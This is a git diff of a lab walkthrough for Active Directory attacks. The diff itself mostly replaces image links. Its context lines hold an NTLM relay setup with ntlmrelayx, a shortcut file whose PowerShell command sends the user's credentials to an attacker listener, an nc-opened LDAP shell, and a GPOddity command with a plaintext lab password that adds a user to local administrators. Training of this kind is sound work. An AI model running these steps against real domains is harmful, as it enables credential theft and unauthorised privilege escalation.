@@ -534,9 +534,9 @@ Abuse an overly permissive Group Policy to add studentx to the local administrat
 
 ### In Learning-Objective 1, we enumerated that there is a directory called 'AI' on the dcorp-ci machine where 'Everyone' has access Looking at the directory (\\\dcorp-ci\AI), we will find a log file
 
-![alt text](image-13.png)
+<img width="1337" height="664" alt="image" src="https://github.com/user-attachments/assets/8b587bf3-71bb-4653-bccc-e53a40b6d97c" />
 
-![alt text](image-14.png)
+<img width="752" height="923" alt="image" src="https://github.com/user-attachments/assets/ad6aa7dd-a69e-4577-8215-1f98c8c2d34f" />
 
 ### It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'. Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity
 
@@ -546,16 +546,17 @@ Abuse an overly permissive Group Policy to add studentx to the local administrat
 
 * wsluser@dcorp-studentx:/mnt/c/Users/studentx$> sudo ntlmrelayx.py -t ldaps://172.16.2.1 -wh 172.16.100.x --http-port '80,8080' -i --no-smb-server
 
-![alt text](image-15.png)
+<img width="1324" height="473" alt="image" src="https://github.com/user-attachments/assets/2c4cdec9-9aab-4025-9284-2b384fe4c078" />
+
 
 ### On the student VM, let's create a Shortcut that connects to the ntlmrelayx listener. 
 ### Go to C:\AD\Tools -> Right Click -> New -> Shortcut. Copy the following command in the Shortcut location:
 
 * C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke_WebRequest -Uri 'http://172.16.100.31' -UseDefaultCredentials"
 
-![alt text](image-16.png)
+<img width="935" height="443" alt="image" src="https://github.com/user-attachments/assets/023f3860-21a8-491f-be02-2c0c100c4b8b" />
 
-![alt text](image-17.png)
+<img width="1348" height="230" alt="image" src="https://github.com/user-attachments/assets/edc365c7-6f10-415c-a74c-3051f0f8964a" />
 
 **Copy shortcut to dcorp-ci**
 
@@ -565,23 +566,26 @@ Abuse an overly permissive Group Policy to add studentx to the local administrat
 
 * wsluser@dcorp-studentx:/mnt/c/Users/studentx$> nc 127.0.0.1 11000
 
-![alt text](image-18.png)
+<img width="1247" height="663" alt="image" src="https://github.com/user-attachments/assets/757ce9b3-d626-40ba-81bb-f9b03a8a9b3c" />
 
-![alt text](image-19.png)
+<img width="1330" height="201" alt="image" src="https://github.com/user-attachments/assets/50cbf95a-2525-43a4-8c4d-6b50346d4ca4" />
+
 
 ### Using this ldap shell, we will provide the studentx user, WriteDACL permissions over Devops Policy {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 
 * Get-DomainGPO | select displayname, name
 
-![alt text](image-20.png)
+<img width="1343" height="390" alt="image" src="https://github.com/user-attachments/assets/769308bb-9b96-4ab8-bad4-6c463eb95b46" />
 
-![alt text](image-21.png)
+<img width="1328" height="473" alt="image" src="https://github.com/user-attachments/assets/f7474f5f-91ee-4b10-b812-f42fbf4351fe" />
 
-![alt text](image-22.png)
+<img width="1326" height="591" alt="image" src="https://github.com/user-attachments/assets/9c8b7358-6fcd-4bb0-a593-50f7a40b5e27" />
+
 
 * write_gpo_dacl student731 {0BF8D01C-1F62-4BDC-958C-57140B67D147}
 
-![alt text](image-23.png)
+<img width="1364" height="122" alt="image" src="https://github.com/user-attachments/assets/5b972b23-1fce-4d2f-9b19-70bfa94706f1" />
+
 
 ### Now, run the GPOddity command to create the new template.
 
@@ -591,7 +595,7 @@ Abuse an overly permissive Group Policy to add studentx to the local administrat
 sudo python3 gpoddity.py --gpo-id '0BF8D01C-1F62-4BDC-958C-57140B67D147' --domain 'dollarcorp.moneycorp.local' --username 'student731' --password 'rMszB5MwUBww29' --command 'net localgroup administrators student731 /add' --rogue-smbserver-ip '172.16.100.31' --rogue-smbserver-share 'std731-gp' --dc-ip '172.16.2.1' --smb-mode none
 ```
 
-![alt text](image-24.png)
+<img width="1386" height="382" alt="image" src="https://github.com/user-attachments/assets/d8045a20-db2e-46e3-80b7-5e8c5ef089fd" />
 
 
 ### Another Ubuntu WSL session, create and share the stdx-gp directory
